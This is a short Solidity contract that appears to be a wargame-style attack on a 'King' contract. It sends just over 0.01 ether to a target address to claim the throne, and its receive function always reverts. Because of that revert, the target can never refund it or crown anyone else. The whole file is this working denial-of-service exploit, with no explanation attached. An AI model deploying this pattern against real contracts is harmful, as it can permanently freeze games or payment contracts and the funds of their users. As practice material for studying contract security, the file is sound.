// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MotherOfDragons {

    function whiteWalkersInvasion(address _kingAddress) public payable {
     (bool success,) = _kingAddress.call{value: 10000000000000001 wei}("");   
     require(success);
    }

    receive() external payable{
        revert();
    }
   

}